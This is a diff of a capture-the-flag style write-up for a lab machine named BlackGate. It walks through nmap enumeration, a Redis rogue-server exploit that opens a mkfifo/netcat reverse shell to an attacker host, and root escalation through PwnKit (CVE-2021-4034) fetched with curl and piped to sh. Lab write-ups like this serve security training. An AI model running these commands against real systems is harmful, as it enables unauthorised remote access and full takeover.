@@ -3,7 +3,7 @@
 # 🐧BlackGate🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -p- -T4 -sV 192.168.156.176
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 20:38 AEDT
 PORT     STATE SERVICE VERSION
@@ -19,7 +19,7 @@ exp.so
 https://github.com/n0b0dyCN/redis-rogue-server     
 
 Then run the script with revershell command
-```
+```console
 $ python3 redis-master.py -r 192.168.156.176 -L 192.168.45.231 -f exp.so -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.231 9001 >/tmp/f"
 
 $ nc -lvnp 9001  
@@ -29,7 +29,7 @@ $ whoami
 prudence
 ```
 run linpeas and found the machine is vulerable to [CVE-2021-4034] PwnKit
-```
+```console
 [+] [CVE-2021-4034] PwnKit
 
    Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
@@ -40,10 +40,10 @@ run linpeas and found the machine is vulerable to [CVE-2021-4034] PwnKit
 ## Privilege Escalation  
 found the way to privilege escalation on github  
 https://github.com/ly4k/PwnKit  
-```
+```console
 sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 ```
-```
+```console
 $ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
 
 root@blackgate:/home/prudence# whoami
